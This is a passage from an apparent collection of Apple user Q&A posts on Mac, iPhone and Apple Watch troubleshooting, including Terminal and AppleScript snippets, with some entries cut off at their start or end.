significant place, photos can be checked against for location for recommendations.\nAs per the comment:\n\n[E]ven if I disable the see suggestions for photos to post option, Google Maps still can access my photos and upload them to anywhere, without showing me a window to pick photos, right?\n\nWould need to see the photos API for that. Till now, what is think is that, it's a native iOS interface to display photos.\n", "Q: 2019 MacBook Pro 15 inch: Screen flicker randomly I purchased a MacBook Pro 15 inch 2019 just a month ago. The screen initially started flickering almost ones every week. It want noticeable at all. Now its increasing and happens almost every 2 hours. Many people ask to switch off automatic graphic switching. I don't think of that as an answer since battery drains really fast.\n\nA: Reset NVRAM\nIf the screen flickers take effect particularly when viewing images while browsing the web, the best way around this might be resetting the NVRAM of your device. Resolving this issue involves rebooting you device. But because the NVRAM is a type of memory that saves data automatically, even when the device is forcefully switched off, this issue will not go away when you just reboot your device. \nTo resolve this issue, switch off your Mac and then turn it back on, pressing down \"Command\" + \"Option\" + \"P\" + \"R\" keys until you hear some chimes or see the screen blinking twice during the restart. If that still doesn’t fix the flickering screen with macOS 10.14, reset the System Management Controller (SMC) as decribed below.\nReset The System Magement Controller (SMC)\nThis method applies only to portable Macs with an inbuilt battery like MacBook Air and MacBook Pro with Retina Display. Details of the steps for resetting the SMC of any other Mac device is also readily available on the web.\nTo reset the SMC, unplug the Mac's external display, and then turn off the Mac. Make sure the device is connected to the MagSafe power adapter. Press down “Shift” + “Control” + “Power” for a couple of seconds and then release them simultaneously. This resets the SMC of the MacBook Pro / Air instantly. Afterwards, press the power button to boot the Mac, and once the Mac is booted, plug back the display.\n", "Q: Show applications in terminal I am a developer and I want to access the applications folder through terminal.

I want to know a command or method to view the contents of the Application folder through terminal.\n\nA: The main Applications directory is in the root directory, so you need to type\ncd /Applications\nls -1\n\nto access it (the -1 option to ls will ensure that the applications are listed in a single column only).\n", "Q: How to scribble backslash (\"\\\") on Apple Watch? My organization's WiFi username & password has punctuations in it.

This makes it really difficult to enter punctuations other than hyphen -, underbar _ and period ..\nAre there options here for entering odd characters or specifically this one?\n\nA: watchOS 9 now supports using iCloud Keychain, or typing on the phone to enter the password on the watch.\nThese combined should make it possible now to join any network.\n\nA: Scribble feature of Apple watch can be awesome. It allows Apple Watch users to discreetly scrawl text replies on their wrists, no iPhone keyboard necessary. \nWhile entering WIFI password, you should get a Scribble screen where you can write with your finger.

I have disabled many features as per our requirements. However, I want to have the same Standard user setup in other macOS machines too. Is there anyway to copy the user profile and create similar one in another macOS machine?\n\nA: You should be able to just zip your current working user folder, and then copy it to the other Mac, where you unzip it into a user folder (the user has been created before the unzip) with the same name, which you can rename afterward.\nOtherwise, you can have a look at the macOS Server, where you can create user profiles.\n", "Q: How can I permanently unhide invisible files on mac (not just make invisible files visible!)? I have a few invisible files. I want to turn them into visible files. That is, I do not just want to make my invisible files show up in the Finder (I have that already, -they all show up) - but I'd like to turn them into normal, unhidden files, just like all my other files.\nHow can I do this on my Mac?\n\nA: There are two ways that I know of to hide a file on macOS:\n\n\n*\n\n*Start the file name with a . (period) -- this is carry over from Unix systems and the Finder still to this day honors the tradition.\n\n*Assign the hidden attribute to the file. To do this, you would use the chflags command-line program via the Terminal app.\nThus to reveal all hidden items in the Finder, one would have to do two things:\n\n\n*\n\n*Enable in Finder viewing of items that start with a .

Our email provider is making a change soon to our SMTP servers, changing the port number to 587 and blocking ports 25 and 465.\nOur clients who use Apple Mail have the \"Automatically manage connection settings\" box ticked, which hides the usual Port & TLS / SSL & Authentication options.\nI am assuming that having that box ticked will handle this change by detecting the port numbers that don't work, then trying the other common port numbers, but I'm not sure if it is safer to disable it & add in the settings manually.\nDoes anyone have any information about how Mail will handle a change like this, if the automatic option is set?\n\nA: There might be two things that you have to do:\nIt should work automatically without any intervention after the port upgrade. But to make it smooth, you might need to re-add your account in Apple Mail. \nYou can manually modify and add specified port too but it depends upon your email provider. However, in most cases, it should go automatically. \n", "Q: How do I tell Bedtime that I am awake? I use iOS Bedtime as my morning alarm to wake up.  Sometimes I wake up before the alarm goes off.  How do I tell Bedtime that I'm awake and that I don't need to be woken that morning?\nThe only method I've been able to come up with is to go into the alarm set up and turn the Bedtime alarm off.  However, this turns it off not only for today, but permanently for all future days as well, and I have to remember to re-enable it before the next morning.  It's easy to forget, so that's not good.  Is there a better way to do this, while using Bedtime?\nIf I don't turn the alarm off when I wake up early, then sometimes I go shower, and the alarm starts ringing while I'm in the shower and I don't notice until I'm out of the shower, which isn't good -- it disturbs others.\n\nA: There's no way to get what you're looking for other than what you're already doing.\nBedtime is made-up of two parts: Bedtime and Wake Up.\nThese are very easy to use but also very limited.  It's not really designed, unfortunately, for one-off changes to the schedule.\nI would recommend looking for a custom Shortcut that you can run to turn off the alarm when you wake up early.

I currently have 30$ which I am spending on ads. But I also have the 100$ promo credit. I currently have only spent 20$ worth of ads. \nSo how do I know when my promo credit is being applied? Will I just have to do the math until 130$ is spent? Or will there be something which indicates for example if I am currently spending promo credit?\n\nA: I don't think there's a specific way to know.  I have the promo $100, too, and I was looking into this.\nThe only way I found out was to check on the available balance every few weeks.  Even doing that, you have to accept that you might go over the promo amount.  Of course, this is exactly what Apple is hoping will happen (in my personal opinion; I don't have any proof for that).\n", "Q: Apple's wired keyboard (with adapter) doesn't work on MacBook Pro 2019 I just switched from my old MacBook Pro (2011) to the newest one.

I recently started using VLC as my background engine, however, when I shut the lid, the video stops. Pressing the play/pause key on the keyboard fixes it. Is there a way to where it will automatically press the play button every time the lid is opened?\nIf not, is there a way to stop VLC from pausing when the lid is shut? It would help greatly. The method of stopping VLC from pausing would be more... \"legit\" I would say.\n\nA: There may be ways to stop your Mac from sleeping when you close the lid, but none of them are recommended, and I'm not even sure the old ways work anymore.\nOption 1: sleepwatcher\nAs far as automating VLC on system wake, that may be possible with sleepwatcher. You ought to able to simulate a press of the spacebar with a bit of AppleScript:\ntell application \"System Events\"\n  key code 49 -- space bar\nend tell\n\nbut you may need to add a slight pause (I'd start with 3 seconds and then adjust down until it failed) so that the system if fully awake before you send it.\nThat will also fail if VLC is not the front-most app. (Do you have to enter a password when you open the lid? If so, that's another consideration.)\n\nOption 2: Keyboard Maestro\nI would be much more likely to use Keyboard Maestro for this. For one thing, it does a lot more than just this one thing, and it can run that AppleScript I mentioned above.\nIt could also make sure that VLC is the active application and then press the Playback » Play menu item, which is probably more likely to work more reliably than sleepwatcher can.\nThe only downside is that Keyboard Maestro isn't free, but IMO it's one of the best purchases you can make for your Mac.\n", "Q: Can I use an older iPad to charge an iPhone by connecting these dongles together?

I am running OSx 10.14.6 and I installed the latest Logitech Camera Settings version 2.6.2. I opened Camera Settings up to find that Follow My Face doesn't seem to be supported.  Any suggestions (Maybe another application?) to get that feature working for Skype and Facetime?\n\nA: I'm surprised their own suite even recognises it - it didn't when the C920 was new…\nFrom Logitech's C920 page\n\nCompatible with:\n  Windows® 10 or later, Windows 8, Windows 7\nWorks in USB Video Device Class (UVC) mode with supported video-calling clients:\n  macOS 10.10 or later\n  Chrome OS™\n  Android™ v 5.0 or above\n  USB port\n  Internet connection\n\nSo for anything other than Windows, there's no specific support, only as a generic 'UVC' device.\nMany Mac users have complained about this over many years… as I got mine in 2012, I doubt it's anything they're going to be adding any time soon.\nYou can get a lot better than Logitech's basic support with a 3rd party app called Webcam Setting [$7.99] & though it can't do 'follow my face' it does make the camera considerably more useful. It also hasn't been updated in 5 years, but then neither has the camera.\nIt works well up to Mojave. I can't test on Catalina, but at least it doesn't get the \"May not work in future OSes\" warning at launch.\n", "Q: Appending the Parent folder Names to the Image File Names in Automator I have this file structure.

I'm looking for a definitive answer, not methods for estimation. Thanks!\nEDIT: I'm not looking for sector-specific values. I'm just trying to understand how much available storage is actually required for a successful update—clearly it's not 7.6 GB.\nEDIT 2: Mysteriously, Xcode now updates with no change in available storage space. In fact, it appears I have a few hundred MB less available storage than before.\n\nA: There's really no easy way to produce a definite answer for you. The definite answer varies from system to system. \nYou could get the definitive answer by freeing a small amount of disk space. Taking a full backup of your system. Try installing. When it fails, restore from backup. Repeat until you have the definitive answer.\nIt would be an unrealistic amount of work to get to a number that you would then have no interest in having, as you have already installed the software.\nEDIT: You have changed your question so that you no longer require a \"definitive\" answer, but rather want an \"approximate answer\". To that I can I add that my installations of Xcode are approx. 15-20 GB in size depending on what exactly is installed on each computer. Note that for updating you'll need room for both the currently installed version plus update files. You might find that it is easier on your disk space requirements to simply delete Xcode, and then reinstall it. You might get be with even less disk space if you download Xcode manually from the Apple web site instead of from the App Store.\n\nA: I don't think there is a definitive answer, because it's likely to depend on the specific Mac & how the data aligns to sector sizes when written. You'd see the same thing if you wrote a 1GB movie file & 1GB of small text files to a drive. The byte count may be the same, but the space used on disk would not.\nIf you look at the three basic ways to see how much space is left on your drive [Storage, Disk Utility & Get Info], one thing you'll notice is they don't actually agree on their definition of \"free\" space.\nIf your drive is so full that you are struggling to squeeze something on - which in itself is not a good thing, you really need to keep 10 - 20% free space, ironically more for a smaller drive - then the figure you need to be looking at is the one in Disk Utility, under the blue bar [green outline].\nThat is the amount of actual free space you have, including purgeable.\nPurgeable data will not just get out of the way if you need the space all in one go. You need to either manually shrink local Time Machine backups, or incrementally fill the drive with junk data then erase it.

The noise monitoring feature seemed to be working fine yesterday but today the complication shows a microphone with a line through it and when I open the Noise app I get the following screen telling me that measurement is suspended because the Watch is in Water Lock or the microphone/speaker is in use.  The Watch is not in Water Lock and the mic/speaker are not in use so I don't understand what the issue is.  I've tried restarting the Watch with no success.  I also tried enabling and disabling Water Lock.  Nothing I've tried so far has enabled the Noise monitoring feature again.  Has anyone any idea what might cause this and how to fix?

I use CarPlay a lot. For navigation I use either Google Maps or Waze (or both). Because they are both from Google I used to close them (swipe them up from the open app list) after I disconnect my phone from the car to reduce their spying activities.\nI recently installed iOS 13 and it introduced a concept of using different app on the phone screen and different app on the car screen.

I backed up my iPhone 6S first (to iTunes on a Mac) and then proceeded to set up the new iPhone 11 Pro Max by restoring from the iPhone 6S backup. \nAfter the restore was complete there were many apps that still needed to download from the App Store. Their thumbnails were on my home screen, but the apps needed to download. So I placed my new iPhone on charge and left it connected to Wi-Fi thinking that today all of the apps would be downloaded. While many of them were, quite a few (about 20) were not. They do have the cloud icon on them though and when I tap on the icon they seem to start to download but then I get a message that says\n\nUnable to Install \"App\". You must purchase this app to install it.\n\nExample screenshot follows.\n\nNow I know I purchased them already using the same Apple ID. I also confirmed this by checking my purchased history. Furthermore, when I tap on View in App Store, it opens up and instead of getting the GET option like you do when you haven't purchased an app before, I get the dot option that you tap on to install an app again.\nMy problem is that tapping on the dot doesn't do anything. Clearly the app is still available, but I can't download it.\nWhat to do?\n\nA: You just need to delete the app (or, more specifically, the icon placeholder for the app) from your iPhone's Home screen. Then when you go to the App Store again you should get the cloud download symbol indicating you've previously purchased the app. Tap on that and it should download just fine.\nTo delete apps from the Home Screen on iOS 13, follow these steps:\n\n\n*\n\n*On your iPhone's home screen, long press on the app icon and let go\n\n*From the options that appear, tap Rearrange Apps\n\n*Now you'll see the familiar jiggle action and the associated cross at top left of the icon\n\n*Tap on the cross to delete the app\n\n*Now proceed to the App Store to download it again\n\n", "Q: Is there a faster way or keyboard shortcut to close files without saving in Preview? When closing an unsaved file in Preview, you're presented with the \"Do you want to keep this new document\" modal:\n\nThere doesn't seem to be a quick way to access the Delete button besides tabbing or using the mouse. I work with a lot of quick throwaway screenshots throughout the day and this step slows me down. \nIs there a keyboard shortcut for this button, or another way to close files that will not show this dialog?\n\nA: In a \"Save As\" window, press ⌘Delete to close the window and delete the unsaved file.\nThis essentially selects the \"Delete\" option from that \"Save As\" window.\nPressing Escape selects the \"Cancel\" option. Enter selects \"Save\".\n\nA: You can create a new Automator.app Quick Action document and add a \"Run AppleScript\" action to your workflow.\nThen you would paste this following AppleScript code into the \"Run AppleScript\" action.\ntell application \"Preview\" to close window 1 saving no\n\nYou can also use this following AppleScript code, instead, if you prefer to close all of the Preview documents at the same time without any dialogs popping up\ntell application \"Preview\" to close windows saving no\n\n\nThen you could save the Automator file as \"Preview Close No Save\".  Once that file is saved you can now assign it a keyboard shortcut in System Preferences.  Now anytime you are using Preview app, any time you use your new assigned keyboard shortcut, it should automatically close the visible document without popping up any dialogs.\n\nIf for some reason your new keyboard shortcut does not work, it may be because it conflicts with another keyboard shortcut already assigned.

In Japan there will not be ECG for potentially many years until it makes it through mountains of bureaucracy.  \nI haven't tried a different Apple ID to enable the ECG, but I heard others have tried without any luck. \nI heard the block is serial number geo-fenced.  It's obviously not a different WatchOS version. What happens if I factory restore in an approved country? \nWhen Japan or other countries approve ECG existing watches will suddenly have ECG so how will it be enabled? \nDo you think this is simply a matter of setting the region, pairing a blocked Japanese watch to an American iPhone and using an American Apple ID? \n\nA: According to a few 2018 articles, the restrictions are based on the region where the watch was sold, and the removal of blocks is implemented by a watchOS update. \nNot tied to ID. No geo-fence. \nThere was speculation that changing the watch's region settings could bypass the restriction, but those articles correct that understanding. \nGiven these facts, the easiest way, and the way that fits the common programming design patterns, to restrict by region would be to disable globally, and with an OS update, enable the feature for the regionally purchased devices, likely by serial number/factory code.\n\nAs for which watchOS features are enabled for which country, Apple provides this handy list. The UK is listed as an approved country for ECG since watchOS 5.2 (March 27, 2019).\n\nA: I would expect the opposite mechanism that what your title says - empirical evidence shows ECG is disabled everywhere by default and only enabled where cleared. This is also observed for COVID-19 location tracking. It’s baked in to iOS but enabled selectively by Apple in specific regions.\nAlso, what matters is the countryApple sent the watch to be sold and not where the watch is today or registered post purchase.\nIf you depend on certain region-based features, please ensure you purchase the device from an authorized seller in your desired country of service and watch for gray market imports or cross-border resale items.\nFor example, warchOS 7.3 expands ECG in Japan, Mayotte, Philippines, and Thailand. Irregular heart rhythm notifications are now available in Japan, Mayotte, Philippines, Taiwan, and Thailand.\n\nBehind the scenes, I expect this activation happens once which writes a configuration profile so the OS can read the value from the Secure Enclave which makes it tamper resistant and survive iOS restores or other regional settings.\nFor most iOS based restrictions, Apple pins the country for the OS specific features to the sales process. Each serialized product gets sold in a specific location which then lights up the features intended for each region.\nWhen Apple chooses to add the feature to a new location, it would push a software update to interpret the stored values differently and not that it would change the value of the “sold-in” region within the Secure Enclave.\nIf this is the mechanism, a theoretical jailbreak could easily enable ECG by patching the routine that checks for a valid region even if it can’t change the record of sale stored on the device.\nI would open a direct Apple support request for them to explain to you why you can’t change your region if that’s something you can do or have done, but I wouldn’t expect them to re-purpose a device sold in another region for legal and possibly also significant logistical reasons.\n\nA: I'm adding this as an answer simply so people can quickly see it and not have to rummage through all the comments.\nLately I've been thinking I wouldn't be surprised if Japan stepped up approval for the ECG as a result of Corona. Sure enough, today it was announced. ECG coming to Japan very soon. It's already been officially approved. Probably get a software update this month. \nYou can say what you want and that it's just a coincidence but that's highly unlikely as Japan takes several years for these kind of things to get approved. Often decades. The timing is just too coincidental. \n", "Q: How can I make a password protected ZIP file from a selection in the Finder app I would like to use \"Quick Actions\" within the Finder app from a selection of files and/or folders to make a password protected ZIP file.\n\nA: This is not a direct solution, however it can be used as an alternate solution because it will create a disk image (.dmg) file of all selected Finder files and or folders, whether the selection is a single item or multiple items.\nglobal myPassword\n\nproperty destinationFolder : (path to documents folder)\nproperty theName : missing value\nproperty isTrue : missing value\n\nset theName to \"New Encrypted Disk Image\"\n\nrun setPassword\ndelay 0.1\nactivate\nset deleteOriginals to button returned of (display dialog \"Would You Like To Delete The Original Files After The Disk Image Has Been Created?\" buttons {\"Yes\", \"No\"} default button 1)\ndelay 0.1\nactivate\nset theName to (display dialog ¬\n    \"Would You Like To Name Your New Disk Image?\" default answer ¬\n    \"New Encrypted Disk Image\" buttons {\"No\", \"Re-Name\"} default button 2 ¬\n    with title \"Name Disk Image?\")\ndelay 0.1\n\nif button returned of theName is \"Re-Name\" then\n    set theName to text returned of theName\nelse\n    set theName to \"New Encrypted Disk Image\"\nend if\n\ntell application \"Finder\"\n    if exists of alias ((destinationFolder as text) & theName) then ¬\n        delete alias ((destinationFolder as text) & theName)\n    set tempFolder to (make new folder at destinationFolder ¬\n        with properties {name:theName}) as alias\n    set theFiles to selection as alias list\n    duplicate theFiles to tempFolder\n    set theContainer to POSIX path of (container of tempFolder as alias)\n    set filesWithTheName to count of (items of (container of tempFolder as alias) ¬\n        whose name contains theName and name extension is \"dmg\")\n    if filesWithTheName is greater than 0 then ¬\n        set theName to theName & filesWithTheName + 1\nend tell\n\nset theDMG to do shell script \"printf  \\\"\" & myPassword & \"\\\" |  hdiutil create -encryption AES-256 -stdinpass -srcfolder '\" & POSIX path of tempFolder & \"' '\" & theContainer & theName & \"'\"\n\ntell application \"Finder\" to delete tempFolder\n\nset theOffset to offset of \"/\" in theDMG\nset theDMG to POSIX file (text theOffset thru -1 of theDMG) as alias\n\ntell application \"Finder\" to set newName to name of theDMG\n\nif deleteOriginals is \"Yes\" then\n    tell application \"Finder\" to delete theFiles\nend if\n\ntell application \"Finder\"\n    activate\n    reveal theDMG\nend tell\n\nscript failedPassVerify\n    activate\n    display dialog ¬\n        \"You Have Unsuccessfully Verified Your Password 3 Times In A Row...

Say I have an iPhone Camera Roll with 1,000 photos or videos in it, and on my Mac, a folder called \"Pictures From Brazil\". I want to copy that folder's pictures onto my iPhone, but I want to keep everything in the Camera Roll.\nCan I use iTunes to do this (syncing photos using the Photos tab in the iPhone section of iTunes), or if I turn on \"Sync Photos\" to copy that folder to my iPhone, will that overwrite my Camera Roll and / or remove its contents?\n\nA: Yes, you can safely sync a specific folder from your Mac to your iPhone via iTunes without overwriting your iPhone's Camera Roll.\nYou don't specify your version of iOS, but typically what will happen is that the sync will create an additional album in the Photos app on your iPhone. So, using your example, if you use iTunes on your Mac to sync selected albums and then select the \"Pictures From Brazil\" folder, this will add an album on your iPhone called \"Pictures From Brazil\".\nThis additional album doesn't impact your Camera Roll at all.\n", "Q: WeChat doesn't generate notification sounds on my iphone I've been using the WeChat app which often fails to generate a notification sound when new messages are received.

How can I fix it? Any suggestions would be appreciated.\nThanks in advance!\n\nA: If the adapter works fine on another Mac (second bullet point) then it is not the adapter. If you have tried a number of different adapters on your Mac and all of them do not work then I would then assume that is it one of two things:\n\n\n*\n\n*A hardware issue with your Mac. EG a bad lightning port.\n\n*An issue with the installation of macOS on your Mac.\n\n\nFrom your description of the symptoms I am leaning towards #1. However since backing up your Mac, re-formatting the HD, reinstalling the OS and restoring your files is a free (if tedious) procedure that would eliminate whether or not it is an OS issue I would start with that.\nAnd if that fails you likely need to take the Mac in for repair.\n", "Q: Are devices supposed to automatically be removed from iCloud when all content and settings are erased?

When choosing to perform a reset (from Settings/General/Reset/Erase all Content and Settings), I had to enter my Apple ID password; the text on this screen stated that this was to disable Find My, which has been done. However, when checking the devices still associated from my account on my new iPhone (from Settings/My Name/iCloud), I noticed that I still had my just-erased device listed, as well as two Apple Watches (one that I'd erased several minutes before doing the same to my old iPhone, and an old Watch that I erased this time last year).\nWhen erasing a device, are these devices then supposed to automatically be removed from the list of associated devices in iCloud or should this be done manually? When erasing my Watch, I clearly remember the notification stating that Find My would be disabled, as well as the Watch being removed from my account but this doesn't appear to be the case - for either my Watch or iPhone.\n\nA: In a word, no.\nSimply erasing a phone does not remove it from your list of devices in iCloud, nor does removing it from \"Find My.\"\nYou have to go into iCloud and purposefully remove it from the list of \"my devices\" to indicate that you no longer own this device.\nJust because you erase a device does not mean you no longer own it. Especially as erasing a device is often a valid troubleshooting step in finding problems with an iOS device.\n", "Q: Compiling from Linux driver for a PCI (not PCI-E) video capture card to use in OSX Is there a way to convert and compile a kernel driver from linux to use it on OSX? I still use a very old Philips SAA7134 chipset based analog video capture card in my machine. This computer though is a hackintosh, so I have the benefit of having a PCI slot. Currently, I am still booting to Windows to use the card, but just out of curiosity i'd wanted to ask if it would be possible. I found source code for linux drivers for this chipset here: https://gitlab.cs.fau.de/me61sewa/passt-mac/tree/fdd70c3399fc448a87487b287f4f0dcfb2e9c52c/drivers/media/video/saa7134\n\nA: It is not possible to just recompile a kernel driver for Linux for macOS.\nIt is possible to convert them - but doing so requires developer competencies in both Linux and macOS kernel areas. I.e. this is definitely not something a normal user can do. It cannot be automated.\nWhat you might be able to do instead is to run a virtualized Linux, and use PCI passthrough to give the Linux kernel access to the raw hardware interface.\n", "Q: Link gcc using Homebrew on Mojave operating system I've looked at other questions similar to mine for answers, but I still have no idea what I'm doing. I'm not new to Macs or working in terminal environments, but when it comes to computer structure I'm a novice. \nI need to be able to compile Fortran codes on my computer. Cool, I'll install one of those: gcc. I have installed homebrew, updated my OS, updated XCode, and installed gcc. Still I cannot get gcc/gfortran to compile properly because there is some kind of broken link:\nconamara:~ me$ brew link gcc\nLinking /usr/local/Cellar/gcc/9.2.0...\nError: Could not symlink include/c++/9.2.0\n/usr/local/include/c++ is not writable.\n\nI tried changing the permissions with chmod but I ran up against an Apple/Mac OS wall. I've Googled this error and the solution was to disable SIP on Mac. I did that. It still did not work. I enabled SIP again since then so my (organizationally owned) computer isn't a security issue.\nSomeone told me last week all I had to do was unlink clang, the default on Mac OS. But there are multiple answers even on here for how to do that that range from creating aliases to changing paths. In theory I get what everything is supposed to do but I have no idea where to start fixing it.\nAnyway, any and all help is appreciated and I'll try to give as many clarifying details as needed. Thanks much!\n\nA: The owner of the /usr/local/include/c++ seems to be changed, which indicates you may used sudo with command brew. Never use sudo brew.\nFirstly, fix the ownership recursively.\nsudo chown -R \"$USER\":admin /usr/local/*\n\nSecondly, relink the package gcc.\nbrew unlink gcc\nbrew link --overwrite gcc\n\nReferences\n\n\n*\n\n*How to fix homebrew permissions?\n", "Q: Is there a way to get information from email using the Terminal and without external software? While I do not understand the Terminal or how email works well enough to know if this question is well-formulated, I am curious if there is a way to use the Terminal to access information from one's email account without using special software (such as Mutt: http://www.mutt.org). Can I tell the computer simply to go to that part of the internet and bring me back the information I want? If not, why not?\n\nA: It depends :-)\nThe Terminal.app itself doesn't know anything about Mail or the Internet, all (well, practically all, it can do some additional stuff but let's keep things simple) it can do is handle keyboard input and text output between the user and a so-called command shell (which on macOS usually is an application/binary called bash or nowadays zsh). So strictly speaking the answer is \"no, Terminal.app is not able to access your mail\".\nIf we widen the scope a bit and read the question as \"Can I access my mail with bash/zsh and any Unix-type utility which is part of macOS and doesn't require additional installations\" the answer is Yes. Using GNU Netcat to access your POP3 mail account shows how netcat (which is called nc on macOS) can be used to access mail stored on a POP server. I didn't find anything for accessing mail on an IMAP server but this should be possible as well.\n", "Q: MacBook Pro 2013 NVME booting Issues A while back I did an SSD upgrade on my 15\" MacBook Pro 2013.  The SSD I'm using is an ADATA SX6000 256gb.  I purchased the Sintech adapter to use with this drive and I had no issues installing MacOS Mojave or any of the sleep issues that I've seen people have online.  \nHowever, after a month of use my MacBook suddenly won't boot and all I can see is a folder with a question mark flashing.  I thought maybe the new SSD unfortunately failed but when I installed it into my main PC it was able to recognize it without any issues.  \nWhat I'm wondering is if this is an adpater problem as the original drive still works with this MacBook, it's only the new one that doesn't.\nI'm looking for help or advice on how I can narrow down the problem?\n\nA: You have pretty much answered your own question.\n\n\n*\n\n*Tried SSD on another system and it works, CHECK\n\n*Old drive works fine, so it's not the Mac, CHECK\n\n\nThis points directly to the only other piece of hardware you haven't tested elsewhere, the adapter. So, unless you can test that adapter and drive in another similar Mac I would say you should replace the adapter.\nNote that I have been doing computer support (Macs, PCs) for a long time and have learned that nothing is always as simple as that. Your issue seems cut and dried, and if I was a betting man I would bet on the adapter being the culprit. But computers are complex beasts and don't always yield to logic. They're too complicated, too many parts interacting in too many ways, for everything to be bug free.\n\nA: Thanks for everyone that commented! I ended up getting a new (different brand) adapter and my Macbook recognized my nvme with no problem. I've had no issues so far.\n", "Q: 2nd external display renders whites as bright yellow I have two external Dell monitors running through a Thunderbolt 3 dock to my  15\" MacBook Pro. On the 2nd one that I connected, all pure white colors show as a very vivid and bright yellow, much like a highlighter. No other color is affected, and off whites render fine.\nWhats odd is that this monitor has this issue regardless of how I connect it to the laptop. Its broken via dock, or via direct DP to TB3 cable. It also has the issue while being the only monitor connected. The original monitor does not have the issue regardless of how I connect it.\nThis would imply a hardware issue with the monitor BUT I have confirmed the monitor works correctly on a windows laptop. Whats also odd is there's a split second after login that the colors are correct, before they go yellow. This also suggests the monitor hardware is fine.\nBoth monitors are running in forced RGB mode, but this did not correct the issue. \nPRAM reset also had no impact. \nIf I go into color calibration for the monitor, everything is fine so long as the target white is below 6500k. 6499k is fine, but the moment I raise it to 6500k (which is the default) the whites snap to highlighter yellow. They remain so for any value higher than 6500k. \nHas anyone ever experienced anything like this?\n\nA: My current workaround is to calibrate the color to have a target white of 6499k. \nThis can be done under Display Settings -> Color -> Calibrate\n", "Q: Terminal: cd command takes about 5 seconds to execute I just upgraded to a new company computer (cloned existing machine) with macOS Mojave 10.14.5 and was shocked to see that my Terminal continues to lag when changing directories (takes about 5 seconds and terminal is frozen during this time period). I thought it was a problem with my 2013 MBP.\nI have spent at least 5 hours looking around for answers and trying different things, but nothing is helping. I've freed up space on the Mac, disabled transparency for Terminal background, reset the Terminal profile back to default (Basic), migrated to a brand new machine.\nFor example: A simple cd Documents

Before Family Sharing, my wife and I always used her iTunes account for all purchases, including iOS apps. Now that Family Sharing exists and also now that two-factor authentication makes it annoying to keep my iPhone authorized to her iTunes account, I'd like to find all the apps on my iPhone that were downloaded under her account, and re-download them under my account (by way of Family Sharing).\nAfter upgrading to iOS 13, I keep getting prompted to sign into her account, presumably because some app on my phone was downloaded under her account, so it's only authorized to run if my phone is signed into her iTunes account.\nIs there any easy or automatic way to find all the apps on my phone that are only authorized for her account, and delete and re-download them from my account so I don't have to stay signed into iTunes as her?\n\nA: Unless I'm misreading your question, doing the following will make the process easier for you:\n\n\n*\n\n*Launch the App Store app on your iPhone\n\n*Tap on your account at the top right corner\n\n*Tap on Purchased\n\n*Now you should see a listing for all accounts in your family group\n\n*Tap on your wife's listing\n\n*At the top, below your wife's name, you'll see two buttons All and Not on this iPhone\n\n*Make sure that the All button is selected\n\n*Now you'll see a listing of all apps* ever purchased under her account\n\n*The ones that have the OPEN option at the right are the ones installed on your iPhone\n\n*Now make a list of the apps in question so you can delete them from your iPhone and install them under your account\n\n\n* Accept for any apps she's actively hidden.\n\nA: First of all, make shure you have iOS 13.1 installed (available yesterday 24th sept 2019). iOS 13.0 was full of very annoying bugs...\nAfter that, since most of your purchases were made from your wife's account, verify she's the Family Organiser and that Purchases Sharing is ON on every family user's account.\n", "Q: What's causing kernel panics?

Boot Camp seems to have become the orphan child of Apple recently - more and more things seem to not be working as of the current Windows 10 (1903) release. These are at least the problems I am now seeing (running macOS 10.14.6 on a Late 2013 15\" MBP):\n\n\n*\n\n*Boot Camp control panel does not start on startup \n\n*Trackpad configuration settings are not saved (e.g. tap to click, 2\nfinger-click for right-click, etc)\n\n*No option in Boot Camp control panel to select starting from macOS boot volume (apparently no APFS support) (requires holding down Option at startup to select macOS boot volume)\n\n\nWhen I download the latest Windows Support Software from Boot Camp Assistant.app, the most recent \"last modified\" dates in the files are March 2016.\nHas Apple announced either way, whether they plan to continue to update Windows Support Software or not?\n\nA: The support site is alive and kicking but since the product is Intel only, we can presume it might be at the end of the line for future Apple Silicon Macs until such time a new announcement is made by Apple.\n\n*\n\n*https://support.apple.com/boot-camp\n\n*https://support.apple.com/en-us/HT201468\nThere were no announcements of note relating to this from WWDC 2019 through September 2021. That could change tomorrow, of course.\nI’ve moved almost all my work devices over to VMware Fusion FWIW. There are plenty of reasons to not virtualize, so I encourage everyone still in the boot camp - check out Boot Runner - it’s amazing value and super helpful for managing one or more installations. If you have more advanced needs, Winclone Pro (or Winclone) are also available.\n\n*\n\n*https://twocanoes.com/products/mac/boot-runner/\n\n*https://twocanoes.com/products/mac/winclone-pro/\nWe haven’t spent any time with Windows on ARM but that would change if we had a need to explore it.\n", "Q: How do I share full-resolution photos between Apple devices? As the title states, I need to know a way of sending full-resolution photos from one Apple device to another (iPhone to iPhone/iPad/Mac) but don't want to lose quality at all.\nI'm guessing photos get downsized in iMessage. What about AirDrop? What about sharing a photo album via iCloud?\nDoes anyone know the definitive answer?\n\nA: Airdrop sends full sized versions.\niCloud link/album sharing sends full size versions.\niMessages can downsize if enabled in Message settings, but I don't know otherwise. \nPut them in a note and add collaborators or create a sharable link.\nPut them in iCloud Drive and share from there.\nUse Dropbox, Firefox Send, Google Drive, OneDrive.\nPlug in the iPhone to a Mac, trust the device and import using Photos.app. And then export unmodified original or let it do so modifications. \n\nA: If your devices support it, please consider testing the new iOS 13 features.\nWith iOS 13 users are finally (!!!) allowed to use a USB key to copy files without using an external app. The iOS \"Finder\" (Files app) is yet planned to do it properly.\n", "Q: Contacts not syncing on iOS 13.1 I have iPhone 7 plus and I have upgraded to version 13.1 but all my contacts info has disappeared.  My contacts are still on cloud, but the problem is with the sync between my device and my cloud.\nAny suggestions?\n\nA: Here's a fix for disappearing contacts in iOS 13.1 on iPhone 7 plus:\nIt turns out the issue isn't with iCloud, it's with a new default in iOS 13.1.\n\n\n*\n\n*Go to your Contacts app.\n\n*Press (+) from the top right and add new contact.\n\n*Save your new contact.\n\n\nNow wait for ~1 minute and your contacts will appear again in your phone.\nProbably the problem is in the sync functions for the first run.\n", "Q: Not enough space on disk to install App Store app, but which one? I get this popup about once a day, but I don't know what \"product\" App Store is talking about.\n\nI tried going to Launchpad, but nothing seemed to be in the middle of downloading (no icon was greyed out). I have 14GB space free, so whatever it is, it would need to be pretty big. The biggest I could imagine would be xcode, but I already have that installed.\nIs there a way to find out what this popup is referring to?\n\nA: Check the \"purgeable\" space of your APFS disk with Disk Utilities. It seems Finder count this space in free space, but not App Store.\nBut you can trick macOS to clean up APFS by creating a huge garbage file, then deleting it.\nYou can create a huge file that will force macOS to clean purgeable files to free you space. In order to do so, type this command in a terminal:\ndd if=/dev/zero of=~/hugefile bs=15m\n\nIt will create a 